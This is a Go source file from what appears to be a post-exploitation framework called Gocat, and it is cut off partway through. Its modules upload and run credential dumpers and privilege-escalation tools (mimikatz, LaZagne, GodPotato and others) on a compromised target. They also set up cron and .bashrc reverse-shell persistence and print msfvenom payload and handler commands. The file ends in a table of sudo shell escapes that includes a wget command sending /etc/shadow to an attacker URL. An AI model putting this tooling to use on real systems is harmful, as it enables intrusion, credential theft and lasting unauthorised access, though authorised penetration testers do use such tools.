package modules

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/realibrahimsql/Gocat/internal/logger"
	"github.com/realibrahimsql/Gocat/internal/session"
)

// Category represents a module category
type Category string

const (
	CatPrivEsc   Category = "Privilege Escalation"
	CatCredDump  Category = "Credential Dumping"
	CatAD        Category = "Active Directory"
	CatForensics Category = "Forensics"
	CatPivoting  Category = "Pivoting"
	CatPersist   Category = "Persistence"
	CatRecon     Category = "Reconnaissance"
	CatExploit   Category = "Exploitation"
	CatMisc      Category = "Misc"
)

// Module represents an extensible post-exploitation module
type Module struct {
	Name           string
	Description    string
	Category       Category
	Enabled        bool
	OnSessionStart bool
	OnFirstAttach  bool
	OnSessionEnd   bool
	SupportedOS    []session.OSType
	RunFunc        func(sess *session.Session, args string) error
	URLs           map[string]string
}

// Registry holds all registered modules
type Registry struct {
	modules map[string]*Module
	mu      sync.RWMutex
}

// DefaultRegistry is the global module registry
var DefaultRegistry = NewRegistry()

// NewRegistry creates a new module registry
func NewRegistry() *Registry {
	r := &Registry{
		modules: make(map[string]*Module),
	}
	r.registerBuiltinModules()
	return r
}

// Register adds a module to the registry
func (r *Registry) Register(mod *Module) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.modules[mod.Name] = mod
}

// Get returns a module by name
func (r *Registry) Get(name string) *Module {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.modules[name]
}

// List returns all modules
func (r *Registry) List() []*Module {
	r.mu.RLock()
	defer r.mu.RUnlock()
	mods := make([]*Module, 0, len(r.modules))
	for _, m := range r.modules {
		mods = append(mods, m)
	}
	return mods
}

// ListByCategory returns modules filtered by category
func (r *Registry) ListByCategory(cat Category) []*Module {
	r.mu.RLock()
	defer r.mu.RUnlock()
	var mods []*Module
	for _, m := range r.modules {
		if m.Category == cat {
			mods = append(mods, m)
		}
	}
	return mods
}

// Run executes a module by name on a session
func (r *Registry) Run(name string, sess *session.Session, args string) error {
	mod := r.Get(name)
	if mod == nil {
		return fmt.Errorf("module '%s' not found", name)
	}

	if !mod.Enabled {
		return fmt.Errorf("module '%s' is disabled", name)
	}

	// Check OS compatibility
	if len(mod.SupportedOS) > 0 {
		supported := false
		for _, os := range mod.SupportedOS {
			if os == sess.OS {
				supported = true
				break
			}
		}
		if !supported {
			return fmt.Errorf("module '%s' does not support %s", name, sess.OS)
		}
	}

	logger.Info("Running module: %s", name)
	return mod.RunFunc(sess, args)
}

// FormatModuleList returns a formatted list of all modules
func (r *Registry) FormatModuleList() string {
	r.mu.RLock()
	defer r.mu.RUnlock()

	categories := map[Category][]*Module{}
	for _, m := range r.modules {
		categories[m.Category] = append(categories[m.Category], m)
	}

	var sb strings.Builder
	sb.WriteString("Available Modules:\n\n")

	catOrder := []Category{CatPrivEsc, CatCredDump, CatAD, CatForensics, CatPivoting, CatPersist, CatRecon, CatExploit, CatMisc}

	for _, cat := range catOrder {
		mods, ok := categories[cat]
		if !ok || len(mods) == 0 {
			continue
		}

		sb.WriteString(fmt.Sprintf("%s:\n", cat))
		for _, m := range mods {
			status := ""
			if !m.Enabled {
				status = ""
			}
			os := "All"
			if len(m.SupportedOS) > 0 {
				osStrs := make([]string, len(m.SupportedOS))
				for i, o := range m.SupportedOS {
					osStrs[i] = string(o)
				}
				os = strings.Join(osStrs, "/")
			}
			sb.WriteString(fmt.Sprintf("  [%s] %-25s %-10s %s\n", status, m.Name, os, m.Description))
		}
		sb.WriteString("\n")
	}

	return sb.String()
}

// Search returns modules matching a term in name, description, or category.
func (r *Registry) Search(term string) []*Module {
	r.mu.RLock()
	defer r.mu.RUnlock()
	term = strings.ToLower(term)
	var mods []*Module
	for _, m := range r.modules {
		if strings.Contains(strings.ToLower(m.Name), term) ||
			strings.Contains(strings.ToLower(m.Description), term) ||
			strings.Contains(strings.ToLower(string(m.Category)), term) {
			mods = append(mods, m)
		}
	}
	return mods
}

// FormatSearch returns a formatted list of modules matching a term.
func (r *Registry) FormatSearch(term string) string {
	mods := r.Search(term)
	if len(mods) == 0 {
		return fmt.Sprintf("No modules match '%s'", term)
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Modules matching '%s':\n", term))
	for _, m := range mods {
		sb.WriteString(fmt.Sprintf("  %-25s [%s] %s\n", m.Name, m.Category, m.Description))
	}
	return sb.String()
}

// Describe returns a detailed view of a single module.
func (r *Registry) Describe(name string) string {
	mod := r.Get(name)
	if mod == nil {
		return fmt.Sprintf("Module '%s' not found. Use 'modules' to list or 'search <term>' to find one.", name)
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Name:        %s\n", mod.Name))
	sb.WriteString(fmt.Sprintf("Category:    %s\n", mod.Category))
	sb.WriteString(fmt.Sprintf("Description: %s\n", mod.Description))
	sb.WriteString(fmt.Sprintf("Enabled:     %v\n", mod.Enabled))
	if len(mod.SupportedOS) > 0 {
		osStrs := make([]string, len(mod.SupportedOS))
		for i, o := range mod.SupportedOS {
			osStrs[i] = string(o)
		}
		sb.WriteString(fmt.Sprintf("OS:          %s\n", strings.Join(osStrs, "/")))
	} else {
		sb.WriteString("OS:          All\n")
	}
	sb.WriteString(fmt.Sprintf("Usage:       run %s <session_id> [args]\n", mod.Name))
	return sb.String()
}

// registerBuiltinModules registers all built-in modules
func (r *Registry) registerBuiltinModules() {
	r.Register(&Module{
		Name:        "linpeas",
		Description: "Upload and run LinPEAS privilege escalation scanner",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		URLs: map[string]string{
			"linpeas": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
		},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
			path, err := sess.Upload(url, sess.FindTmpDir())
			if err != nil {
				return fmt.Errorf("failed to upload linpeas: %w", err)
			}
			sess.Exec(fmt.Sprintf("chmod +x %s && %s", path, path), 0)
			return nil
		},
	})

	r.Register(&Module{
		Name:        "winpeas",
		Description: "Upload WinPEAS privilege escalation scanner",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		URLs: map[string]string{
			"winpeas_any": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe",
			"winpeas_bat": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
		},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
			_, err := sess.Upload(url, sess.FindTmpDir())
			if err != nil {
				return fmt.Errorf("failed to upload winpeas: %w", err)
			}
			return nil
		},
	})

	r.Register(&Module{
		Name:        "lse",
		Description: "Upload and run Linux Smart Enumeration",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"
			path, err := sess.Upload(url, sess.FindTmpDir())
			if err != nil {
				return fmt.Errorf("failed to upload lse: %w", err)
			}
			sess.Exec(fmt.Sprintf("chmod +x %s && %s -l 1", path, path), 0)
			return nil
		},
	})

	r.Register(&Module{
		Name:        "les",
		Description: "Upload and run Linux Exploit Suggester",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh"
			path, err := sess.Upload(url, sess.FindTmpDir())
			if err != nil {
				return fmt.Errorf("failed to upload les: %w", err)
			}
			sess.Exec(fmt.Sprintf("chmod +x %s && %s", path, path), 0)
			return nil
		},
	})

	r.Register(&Module{
		Name:        "pspy",
		Description: "Upload pspy process monitor",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"
			if sess.Arch == "i386" || sess.Arch == "i686" {
				url = "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32"
			}
			path, err := sess.Upload(url, sess.FindTmpDir())
			if err != nil {
				return fmt.Errorf("failed to upload pspy: %w", err)
			}
			sess.Exec(fmt.Sprintf("chmod +x %s", path), 0)
			logger.Info("pspy uploaded to %s. Run it manually.", path)
			return nil
		},
	})

	r.Register(&Module{
		Name:        "traitor",
		Description: "Upload Traitor auto privilege escalation tool",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			urlMap := map[string]string{
				"x86_64":  "https://github.com/liamg/traitor/releases/latest/download/traitor-amd64",
				"i386":    "https://github.com/liamg/traitor/releases/latest/download/traitor-386",
				"i686":    "https://github.com/liamg/traitor/releases/latest/download/traitor-386",
				"aarch64": "https://github.com/liamg/traitor/releases/latest/download/traitor-arm64",
				"arm64":   "https://github.com/liamg/traitor/releases/latest/download/traitor-arm64",
			}
			url, ok := urlMap[sess.Arch]
			if !ok {
				return fmt.Errorf("no traitor binary for architecture: %s", sess.Arch)
			}
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "deepce",
		Description: "Upload and run Deepce container escape tool",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh"
			path, err := sess.Upload(url, sess.FindTmpDir())
			if err != nil {
				return err
			}
			sess.Exec(fmt.Sprintf("chmod +x %s && %s", path, path), 0)
			return nil
		},
	})

	r.Register(&Module{
		Name:        "godpotato",
		Description: "Upload GodPotato privilege escalation (Windows)",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "printspoofer",
		Description: "Upload PrintSpoofer privilege escalation (Windows)",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
			if sess.Arch == "x86-based_PC" {
				url = "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe"
			}
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "powerup",
		Description: "Upload PowerUp privilege escalation (Windows)",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "mimikatz",
		Description: "Upload Mimikatz credential dumping tool",
		Category:    CatCredDump,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "lazagne",
		Description: "Upload LaZagne credential extraction tool",
		Category:    CatCredDump,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "snaffler",
		Description: "Upload Snaffler credential hunting tool",
		Category:    CatCredDump,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "sharpweb",
		Description: "Upload SharpWeb browser credential extractor",
		Category:    CatCredDump,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/djhohnstein/SharpWeb/releases/download/v1.2/SharpWeb.exe"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "powerview",
		Description: "Upload PowerView AD enumeration script",
		Category:    CatAD,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "sharphound",
		Description: "Upload SharpHound AD data collector",
		Category:    CatAD,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/SpecterOps/SharpHound/releases/download/v2.8.1/SharpHound_v2.8.1_windows_x86.zip"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "chisel",
		Description: "Upload Chisel tunneling tool",
		Category:    CatPivoting,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix, session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			var url string
			if sess.OS == session.OSUnix {
				switch sess.Arch {
				case "x86_64":
					url = "https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz"
				case "i386", "i686":
					url = "https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_386.gz"
				case "aarch64", "arm64":
					url = "https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_arm64.gz"
				default:
					return fmt.Errorf("no chisel binary for arch: %s", sess.Arch)
				}
			} else {
				url = "https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_amd64.zip"
			}
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "ligolo",
		Description: "Upload Ligolo-ng tunneling agent",
		Category:    CatPivoting,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix, session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			var url string
			if sess.OS == session.OSUnix {
				switch sess.Arch {
				case "x86_64":
					url = "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz"
				case "aarch64", "arm64":
					url = "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_arm64.tar.gz"
				default:
					return fmt.Errorf("no ligolo binary for arch: %s", sess.Arch)
				}
			} else {
				url = "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip"
			}
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "panix",
		Description: "Upload PANIX persistence toolkit",
		Category:    CatPersist,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/Aegrah/PANIX/releases/latest/download/panix.sh"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "uac",
		Description: "Upload Unix-like Artifacts Collector",
		Category:    CatForensics,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/tclahr/uac/releases/download/v3.2.0/uac-3.2.0.tar.gz"
			path, err := sess.Upload(url, sess.FindTmpDir())
			if err != nil {
				return err
			}
			logger.Info("UAC uploaded to %s. Extract with: tar xf %s", path, path)
			return nil
		},
	})

	r.Register(&Module{
		Name:        "procmemdump",
		Description: "Upload Linux process memory dumper",
		Category:    CatForensics,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://raw.githubusercontent.com/tclahr/uac/refs/heads/main/bin/linux/linux_procmemdump.sh"
			path, err := sess.Upload(url, sess.FindTmpDir())
			if err != nil {
				return err
			}
			sess.Exec(fmt.Sprintf("chmod +x %s", path), 0)
			logger.Info("procmemdump uploaded to %s", path)
			return nil
		},
	})

	r.Register(&Module{
		Name:        "sysinfo",
		Description: "Collect system information",
		Category:    CatRecon,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix, session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			if sess.OS == session.OSUnix {
				commands := []string{
					"uname -a",
					"cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null",
					"whoami && id",
					"hostname",
					"ip addr 2>/dev/null || ifconfig",
					"cat /etc/passwd | grep -v nologin",
					"cat /etc/crontab 2>/dev/null",
					"ls -la /etc/sudoers 2>/dev/null",
					"env",
					"df -h",
					"ps aux",
					"netstat -tlnp 2>/dev/null || ss -tlnp",
				}
				for _, cmd := range commands {
					logger.Info(">>> %s", cmd)
					resp, err := sess.Exec(cmd, 5*time.Second)
					if err == nil {
						fmt.Println(resp)
					}
					fmt.Println()
				}
			} else if sess.OS == session.OSWindows {
				commands := []string{
					"systeminfo",
					"whoami /all",
					"ipconfig /all",
					"netstat -ano",
					"tasklist /v",
					"net user",
					"net localgroup administrators",
				}
				for _, cmd := range commands {
					logger.Info(">>> %s", cmd)
					resp, err := sess.Exec(cmd, 10*time.Second)
					if err == nil {
						fmt.Println(resp)
					}
					fmt.Println()
				}
			}
			return nil
		},
	})

	r.Register(&Module{
		Name:        "cleanup",
		Description: "Remove all uploaded files from the target",
		Category:    CatMisc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix, session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			removed := sess.Cleanup()
			logger.Info("Cleaned up %d files", removed)
			return nil
		},
	})

	r.Register(&Module{
		Name:        "persist_cron",
		Description: "Setup cron-based persistence (Unix)",
		Category:    CatPersist,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			if args == "" {
				return fmt.Errorf("usage: persist_cron <reverse_shell_command>")
			}
			cmd := fmt.Sprintf(`(crontab -l 2>/dev/null; echo "*/5 * * * * %s") | crontab -`, args)
			_, err := sess.Exec(cmd, 5*time.Second)
			if err != nil {
				return fmt.Errorf("failed to add cron entry: %w", err)
			}
			logger.Info("Cron persistence added successfully")
			return nil
		},
	})

	r.Register(&Module{
		Name:        "persist_bashrc",
		Description: "Setup .bashrc persistence (Unix)",
		Category:    CatPersist,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			if args == "" {
				return fmt.Errorf("usage: persist_bashrc <reverse_shell_command>")
			}
			cmd := fmt.Sprintf(`echo '%s &' >> ~/.bashrc`, args)
			_, err := sess.Exec(cmd, 3*time.Second)
			if err != nil {
				return fmt.Errorf("failed to modify .bashrc: %w", err)
			}
			logger.Info(".bashrc persistence added successfully")
			return nil
		},
	})

	r.Register(&Module{
		Name:        "conptyshell",
		Description: "Upload ConPtyShell for Windows PTY",
		Category:    CatExploit,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "sigmapotato",
		Description: "Upload SigmaPotato privilege escalation (Windows)",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/BeichenDream/SigmaPotato/releases/download/v1.0/SigmaPotato.exe"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "adpeas",
		Description: "Upload adPEAS Active Directory enumeration script",
		Category:    CatAD,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/61106960/adPEAS/releases/latest/download/adPEAS.ps1"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "seatbelt",
		Description: "Upload GhostPack Seatbelt host enumeration (Windows)",
		Category:    CatAD,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			url := "https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe"
			_, err := sess.Upload(url, sess.FindTmpDir())
			return err
		},
	})

	r.Register(&Module{
		Name:        "meterpreter",
		Description: "Print msfvenom/handler lines to spawn a Meterpreter session",
		Category:    CatExploit,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix, session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			parts := strings.Fields(args)
			if len(parts) < 1 {
				return fmt.Errorf("usage: meterpreter <lhost> [lport]")
			}
			lhost := parts[0]
			lport := "4444"
			if len(parts) > 1 {
				lport = parts[1]
			}
			payload, format, ext := "linux/x64/meterpreter/reverse_tcp", "elf", "elf"
			if sess.OS == session.OSWindows {
				payload, format, ext = "windows/x64/meterpreter/reverse_tcp", "exe", "exe"
			}
			logger.Info("Build the staged payload on your machine:")
			logger.Info("  msfvenom -p %s LHOST=%s LPORT=%s -f %s -o /tmp/payload.%s",
				payload, lhost, lport, format, ext)
			logger.Info("Start the handler (msfconsole):")
			logger.Info("  use exploit/multi/handler; set PAYLOAD %s; set LHOST %s; set LPORT %s; run",
				payload, lhost, lport)
			logger.Info("Then deliver it, e.g.: upload <id> /tmp/payload.%s", ext)
			return nil
		},
	})

	r.Register(&Module{
		Name:        "enumerate",
		Description: "Automated enumeration, cached as facts for report/escalate",
		Category:    CatRecon,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix, session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			return runEnumerate(sess)
		},
	})

	r.Register(&Module{
		Name:        "report",
		Description: "Render a markdown host report from session facts",
		Category:    CatRecon,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix, session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			return runReport(sess)
		},
	})

	r.Register(&Module{
		Name:        "escalate",
		Description: "Suggest privilege escalation paths (sudo/suid vs GTFOBins)",
		Category:    CatPrivEsc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			return runEscalate(sess)
		},
	})

	r.Register(&Module{
		Name:        "implant",
		Description: "Manage persistent implants (list/install/remove)",
		Category:    CatPersist,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix},
		RunFunc: func(sess *session.Session, args string) error {
			return runImplant(sess, args)
		},
	})

	r.Register(&Module{
		Name:        "tamper",
		Description: "Track uploaded files and revert them (log/revert)",
		Category:    CatMisc,
		Enabled:     true,
		SupportedOS: []session.OSType{session.OSUnix, session.OSWindows},
		RunFunc: func(sess *session.Session, args string) error {
			action := strings.ToLower(strings.TrimSpace(args))
			if i := strings.Index(action, " "); i >= 0 {
				action = action[:i]
			}
			switch action {
			case "revert":
				removed := sess.Cleanup()
				logger.Info("Reverted %d tampered file(s)", removed)
				return nil
			case "", "log", "list":
				if len(sess.UploadedPaths) == 0 {
					logger.Info("No tracked tampers on session [%d]", sess.ID)
					return nil
				}
				logger.Info("Tracked tampers on session [%d]:", sess.ID)
				for path := range sess.UploadedPaths {
					fmt.Println("  " + path)
				}
				logger.Info("Run with 'revert' to remove them: run tamper %d revert", sess.ID)
				return nil
			default:
				return fmt.Errorf("usage: tamper [log|revert]")
			}
		},
	})
}

// enumGroup is one labeled batch of enumeration commands.
type enumGroup struct {
	title string
	cmds  []string
}

func enumGroups(osType session.OSType) []enumGroup {
	if osType == session.OSWindows {
		return []enumGroup{
			{"identity", []string{"whoami /all"}},
			{"host", []string{"systeminfo"}},
			{"network", []string{"ipconfig /all", "netstat -ano"}},
			{"users", []string{"net user", "net localgroup administrators"}},
			{"privileges", []string{"whoami /priv"}},
			{"processes", []string{"tasklist"}},
		}
	}
	return []enumGroup{
		{"identity", []string{"whoami; id"}},
		{"host", []string{"uname -a", "cat /etc/os-release 2>/dev/null | head -5; hostname"}},
		{"network", []string{"ip -brief addr 2>/dev/null || ifconfig", "ss -tlnp 2>/dev/null | head -20 || netstat -tlnp 2>/dev/null | head -20"}},
		{"users", []string{"cat /etc/passwd | grep -v nologin | cut -d: -f1,3,7", "ls -la /home/ 2>/dev/null"}},
		{"sudo", []string{"sudo -n -l 2>&1 | head -30"}},
		{"suid", []string{"find / -perm -4000 -type f 2>/dev/null | head -30"}},
		{"scheduled", []string{"cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null", "systemctl list-timers --no-pager 2>/dev/null | head -15"}},
		{"processes", []string{"ps aux --sort=-%cpu 2>/dev/null | head -15"}},
	}
}

// runEnumerate gathers facts, prints them grouped, caches the full text in
// sess.Tasks and writes ENUM.md next to the session log.
func runEnumerate(sess *session.Session) error {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("# Enumeration: session [%d] %s\n", sess.ID, time.Now().Format(time.RFC3339)))
	for _, g := range enumGroups(sess.OS) {
		sb.WriteString(fmt.Sprintf("\n## %s\n", g.title))
		for _, cmd := range g.cmds {
			logger.Info(">>> %s", cmd)
			resp, err := sess.Exec(cmd, 10*time.Second)
			if err != nil {
				sb.WriteString(fmt.Sprintf("### $ %s\n(error: %v)\n", cmd, err))
				continue
			}
			fmt.Println(resp)
			sb.WriteString(fmt.Sprintf("### $ %s\n%s\n", cmd, resp))
		}
	}
	facts := sb.String()
	sess.Tasks["enumerate"] = []interface{}{facts}
	if sess.Directory != "" {
		path := filepath.Join(sess.Directory, "ENUM.md")
		if err := os.WriteFile(path, []byte(facts), 0o640); err != nil {
			logger.Warn("Failed to write %s: %v", path, err)
		} else {
			logger.Info("Facts cached: %s", path)
		}
	}
	sess.Record([]byte(facts), false)
	return nil
}

// runReport renders a markdown host report from session fields plus cached
// enumerate facts when available.
func runReport(sess *session.Session) error {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("# Host report: session [%d]\n\n", sess.ID))
	sb.WriteString(fmt.Sprintf("- Target: %s | Host: %s | Arch: %s\n", sess.Target, sess.Hostname, sess.Arch))
	sb.WriteString(fmt.Sprintf("- OS: %s | System: %s | User: %s\n", sess.OS, sess.System, sess.User))
	sb.WriteString(fmt.Sprintf("- Shell: %s | PTY: %v | Agent: %v\n", sess.Type, sess.PTYReady, sess.AgentActive))
	sb.WriteString(fmt.Sprintf("- Binaries: %d known | TmpDir: %s | Uploads: %d tracked\n",
		len(sess.Binaries), sess.TmpDir, len(sess.UploadedPaths)))
	if facts, ok := enumFacts(sess); ok {
		sb.WriteString("\n---\n\n")
		sb.WriteString(facts)
	} else {
		sb.WriteString("\nNo cached facts. Run the enumerate module first for full detail.\n")
	}
	report := sb.String()
	fmt.Println(report)
	if sess.Directory != "" {
		path := filepath.Join(sess.Directory, "REPORT.md")
		if err := os.WriteFile(path, []byte(report), 0o640); err != nil {
			return fmt.Errorf("failed to write %s: %w", path, err)
		}
		logger.Info("Report written: %s", path)
	}
	return nil
}

func enumFacts(sess *session.Session) (string, bool) {
	items, ok := sess.Tasks["enumerate"]
	if !ok || len(items) == 0 {
		return "", false
	}
	facts, ok := items[0].(string)
	return facts, ok && facts != ""
}

// gtfobins maps common binaries to one-line sudo/suid escalation hints.
var gtfobins = map[string]string{
	"vim":       "sudo vim -c ':!/bin/sh'",
	"vi":        "sudo vi -c ':!/bin/sh'",
	"find":      "sudo find . -exec /bin/sh \\; -quit",
	"less":      "sudo less /etc/profile → !/bin/sh",
	"more":      "sudo more /etc/profile → !/bin/sh",
	"man":       "sudo man man → !/bin/sh",
	"awk":       "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
	"gawk":      "sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
	"tar":       "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
	"nano":      "sudo nano → ^R^X → reset; sh -c 'exec sh <&1 >&1 2>&1'",
	"python":    "sudo python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'",
	"python3":   "sudo python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\")'",
	"perl":      "sudo perl -e 'exec \"/bin/sh\";'",
	"ruby":      "sudo ruby -e 'exec \"/bin/sh\"'",
	"node":      "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'",
	"nodejs":    "sudo nodejs -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'",
	"php":       "sudo php -r 'system(\"/bin/sh\");'",
	"lua":       "sudo lua -e 'os.execute(\"/bin/sh\")'",
	"git":       "sudo git -p help config → !/bin/sh",
	"ftp":       "sudo ftp → !/bin/sh",
	"nmap":      "sudo nmap --interactive (legacy) → !sh",
	"wget":      "sudo wget --post-file=/etc/shadow <attacker-url> (exfil only)",
